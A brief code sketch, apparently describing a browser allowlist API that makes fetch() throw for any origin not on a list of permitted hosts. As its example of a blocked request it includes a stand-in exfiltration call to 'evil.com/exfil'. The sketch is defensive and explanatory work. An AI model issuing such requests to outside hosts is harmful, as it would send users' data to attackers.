    the code (sketch)

    // In the document
navigator.connectionAllowlist.set([
  "https://api.example.com",
  "https://*.cdn.example.com",
]);

// Any fetch() to an origin not on the list throws.
await fetch("https://api.example.com/users");  // OK
await fetch("https://evil.com/exfil");          // throws
